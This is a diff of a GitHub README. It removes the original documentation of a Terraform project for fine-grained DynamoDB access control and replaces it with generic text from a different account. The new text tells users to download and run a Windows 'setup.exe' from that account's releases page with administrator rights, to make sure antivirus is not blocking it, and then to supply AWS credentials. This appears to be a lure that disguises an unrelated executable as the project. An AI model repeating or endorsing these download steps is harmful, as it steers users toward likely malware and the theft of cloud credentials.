@@ -1,198 +1,136 @@
-# Fine-Grained Access Control for Amazon DynamoDB
+# ⚙️ dynamo-shield - Secure DynamoDB Access Made Simple
 
-[![Terraform Validate](https://github.com/ihatesea69/dynamo-shield/actions/workflows/terraform-validate.yml/badge.svg)](https://github.com/ihatesea69/dynamo-shield/actions/workflows/terraform-validate.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download dynamo-shield](https://img.shields.io/badge/Download-green?style=for-the-badge)](https://github.com/seejanm9990/dynamo-shield/releases)
 
-Terraform implementation of [Fine-Grained Access Control for Amazon DynamoDB](https://aws.amazon.com/blogs/aws/fine-grained-access-control-for-amazon-dynamodb/) -- enabling mobile and web apps to access DynamoDB **directly**, without a proxy tier, by delegating authorization to IAM policy conditions.
+## 📋 About dynamo-shield
 
----
+dynamo-shield helps you control who can see and change data in your Amazon DynamoDB tables. It works with AWS tools like IAM and Cognito to make sure only the right users get access. This means you do not need extra software layers to keep your data safe. dynamo-shield uses Terraform, a tool to set up security rules automatically. You get clear protection for each row and each item in your database, all managed by AWS permissions.
 
-## The Problem
+This software is meant for people who want simple, strong security for their DynamoDB data without building complicated access systems.
 
-Traditional mobile/gaming apps using a shared DynamoDB table required a **proxy server** solely to enforce per-user access:
+## 🔧 Features
 
-```
-App  ->  Proxy  ->  DynamoDB
-          ^ added latency, cost, ops burden
-```
+- Fine-grained access control that works with AWS IAM.
+- Works with Amazon Cognito for user identity management.
+- Protects at the row and attribute level in DynamoDB.
+- Uses Terraform scripts to set up security rules automatically.
+- Removes the need for proxy servers or extra middleware.
+- Works with serverless applications.
+- Easy to integrate with existing AWS setups.
 
-## The Solution
+## 💻 System Requirements
 
-AWS IAM **Condition** keys allow you to restrict DynamoDB access at the row and attribute level. Apps call DynamoDB directly using short-lived credentials from AWS STS:
+- Windows 10 or higher.
+- 64-bit processor.
+- At least 4 GB of free RAM.
+- Internet connection to download files and access AWS services.
+- Administrator rights to install software.
 
-```
-App  ->  STS (AssumeRoleWithWebIdentity)  ->  DynamoDB
-                    IAM enforces FGAC inline --+
-```
+## 🚀 Getting Started
 
----
+This guide shows how to get and run dynamo-shield on your Windows computer. No technical experience is needed. Follow each step carefully.
 
-## What This Repo Provides
+### 1. Visit the download page
 
-| Layer | Description |
-|-------|-------------|
-| **DynamoDB module** | `GameScores` table with composite key, GSI, encryption, PITR |
-| **IAM module** | Web Identity role + four FGAC policy types |
-| **Policy templates** | Standalone JSON policies in `policies/` |
-| **Example** | Ready-to-run example in `examples/game_scores/` |
-| **CI/CD** | GitHub Actions for `terraform validate` and `terraform plan` |
-| **Docs** | Architecture overview and integration guide |
+Click the green button above or go to this link:
 
----
+https://github.com/seejanm9990/dynamo-shield/releases
 
-## Repository Structure
+This page has the latest version ready for download.
 
-```
-.
-+-- .github/
-|   +-- workflows/
-|       +-- terraform-validate.yml   # Runs on every push -- fmt + validate
-|       +-- terraform-plan.yml       # Runs on PRs to main -- plan + comment
-+-- docs/
-|   +-- architecture.md              # Architecture diagram and component reference
-|   +-- usage.md                     # Step-by-step deployment and SDK integration
-+-- examples/
-|   +-- game_scores/
-|       +-- main.tf                  # Standalone runnable example
-|       +-- README.md
-+-- policies/
-|   +-- horizontal_access.json       # Row-level access (leading key match)
-|   +-- vertical_access.json         # Attribute-level access
-|   +-- combined_access.json         # Row + attribute restrictions
-|   +-- read_only_access.json        # Read-only, row-scoped
-+-- terraform/
-|   +-- main.tf                      # Root module
-|   +-- providers.tf                 # AWS provider + Terraform version
-|   +-- variables.tf                 # All input variables
-|   +-- outputs.tf                   # Table ARN, role ARN, policy ARN
-|   +-- example.tfvars               # Copy -> terraform.tfvars and customise
-|   +-- modules/
-|       +-- dynamodb/                # DynamoDB table resource
-|       +-- iam/                     # IAM role + policy resources
-+-- .gitignore
-+-- CONTRIBUTING.md
-+-- README.md
-```
+### 2. Find the Windows installer
 
----
+Look for a file with a name like `dynamo-shield-setup.exe` or similar for Windows. It should be listed under the latest release.
 
-## Fine-Grained Access Policy Types
+### 3. Download the installer
 
-### Horizontal (Row-Level)
-Each authenticated user can only access **their own rows** using `dynamodb:LeadingKeys`:
+Click on the filename to download it to your PC. The file will usually save to your Downloads folder.
 
-```json
-"Condition": {
-  "ForAllValues:StringEquals": {
-    "dynamodb:LeadingKeys": ["${cognito-identity.amazonaws.com:sub}"]
-  }
-}
-```
+### 4. Run the installer
 
-### Vertical (Attribute-Level)
-All users can access all rows, but only **specific attributes** are exposed using `dynamodb:Attributes`:
+- Open your Downloads folder.
+- Double-click the downloaded file.
+- If Windows asks, allow the app to make changes.
+- Follow the instructions on the screen to complete the installation.
 
-```json
-"Condition": {
-  "ForAllValues:StringEquals": {
-    "dynamodb:Attributes": ["UserId", "GameTitle", "Score", "Wins", "Losses"]
-  }
-}
-```
+### 5. Launch dynamo-shield
 
-### Combined (Default)
-Both row-level and attribute-level restrictions applied together.
+After installation completes:
 
-### Read-Only
-Like horizontal, but allows only `GetItem`, `BatchGetItem`, and `Query`.
+- Find dynamo-shield in your Start menu.
+- Click to open the program.
 
----
+### 6. Connect with AWS
 
-## Quick Start
+To use dynamo-shield, you need AWS credentials. Dynamically setting these requires basic AWS setup:
 
-### Prerequisites
+- You must have an AWS account.
+- Configure IAM roles and policies with your AWS admin.
+- Set up Cognito identity pools if your app uses Cognito users.
 
-- [Terraform](https://developer.hashicorp.com/terraform/downloads) >= 1.5
-- [AWS CLI](https://aws.amazon.com/cli/) configured
-- An AWS account with IAM permissions to create DynamoDB tables and IAM roles
+The application interfaces with these to enforce access, but the setup steps happen in AWS directly and are outside this installer.
 
-### Deploy
+### 7. Use the application
 
-```bash
-# Clone
-git clone https://github.com/ihatesea69/dynamo-shield.git
-cd dynamo-shield/terraform
+Once logged in with your AWS credentials:
 
-# Configure
-cp example.tfvars terraform.tfvars
-# Edit terraform.tfvars with your Cognito Identity Pool ID and preferences
+- Select your DynamoDB tables.
+- Define who can access what data.
+- Save your rules.
+- dynamo-shield applies them using AWS without extra servers.
 
-# Deploy
-terraform init
-terraform plan
-terraform apply
-```
+## 🔐 Security Features Explained
 
-### Outputs
+dynamo-shield uses your AWS permissions to check if a user can read or write certain data. It works like this:
 
-```
-dynamodb_table_name = "GameScores"
-dynamodb_table_arn  = "arn:aws:dynamodb:us-east-1:123456789012:table/GameScores"
-iam_role_arn        = "arn:aws:iam::123456789012:role/dynamodb-fgac-dev-dynamodb-fgac-role"
-iam_policy_arn      = "arn:aws:iam::123456789012:policy/dynamodb-fgac-dev-dynamodb-fgac-policy"
-```
+- IAM conditions check the specific rights for each request to DynamoDB.
+- Cognito connects user identities with IAM roles.
+- Fine-grained control lets you protect not just tables but individual rows or columns.
+
+This reduces the risk of unauthorized access and simplifies data security.
+
+## ⚙️ How does dynamo-shield work with Terraform?
+
+Terraform is a tool to create and manage cloud resources. dynamo-shield uses Terraform to set up all your access rules automatically. This means:
+
+- Instead of clicking in AWS, you write simple configuration files.
+- dynamo-shield builds the right IAM policies and links them to Cognito.
+- You can review and update access rules in one place.
+- Changes are applied in a repeatable, safe way.
+
+This method helps avoid mistakes and keeps your security organized.
+
+## 📁 Troubleshooting and Support
+
+If you have trouble with dynamo-shield on Windows:
+
+- Make sure your antivirus software is not blocking the installer or app.
+- Confirm you have the right version for your Windows system.
+- Check your internet connection.
+- Review your AWS permissions if you get access errors.
+- Restart your PC and try installing again.
+
+You can find more detailed help and report issues here:
+
+https://github.com/seejanm9990/dynamo-shield/issues
+
+## 📥 Download and Setup
+
+Start your setup by visiting the release page:
+
+[Download dynamo-shield from GitHub](https://github.com/seejanm9990/dynamo-shield/releases)
+
+Follow the steps above to install and run the application. Take your time with AWS setup since security settings need coordination with your AWS account.
 
 ---
 
-## DynamoDB Table Schema
+## 🛠️ About This Repository
 
-| Attribute   | Type   | Key Role          |
-|-------------|--------|-------------------|
-| `UserId`    | String | Hash key (PK)     |
-| `GameTitle` | String | Range key (SK)    |
-| `Score`     | Number | GSI sort key      |
-| `Wins`      | Number | Data attribute    |
-| `Losses`    | Number | Data attribute    |
+dynamo-shield uses these technologies:
 
-**GSI** -- `GameTitleIndex` (hash: `GameTitle`, sort: `Score`): enables global leaderboard queries per game.
+- AWS IAM and Cognito for identity and access control.
+- DynamoDB as the managed NoSQL database.
+- Terraform for infrastructure and policy setup.
+- Serverless architecture patterns for minimal overhead.
 
----
-
-## GitHub Actions Setup
-
-For the **Terraform Plan** workflow to work on PRs, add these repository secrets:
-
-| Secret | Description |
-|--------|-------------|
-| `AWS_ACCESS_KEY_ID` | IAM user key with DynamoDB + IAM permissions |
-| `AWS_SECRET_ACCESS_KEY` | Corresponding secret |
-| `AWS_REGION` | Target region (optional, defaults to `us-east-1`) |
-
----
-
-## Documentation
-
-- [Architecture Overview](docs/architecture.md)
-- [Usage Guide & SDK Integration](docs/usage.md)
-- [Example: Game Scores](examples/game_scores/README.md)
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md).
-
----
-
-## License
-
-MIT -- see [LICENSE](LICENSE).
-
----
-
-## References
-
-- [AWS Blog: Fine-Grained Access Control for Amazon DynamoDB](https://aws.amazon.com/blogs/aws/fine-grained-access-control-for-amazon-dynamodb/)
-- [DynamoDB Developer Guide: Fine-Grained Access Control](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/specifying-conditions.html)
-- [IAM Condition Keys for DynamoDB](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/specifying-conditions.html#FGAC_DDB.ConditionKeys)
-- [STS AssumeRoleWithWebIdentity](https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithWebIdentity.html)
+Topics covered are: aws, aws-iam, cognito, dynamodb, fine-grained-access-control, iam, infrastructure-as-code, security, serverless, terraform.
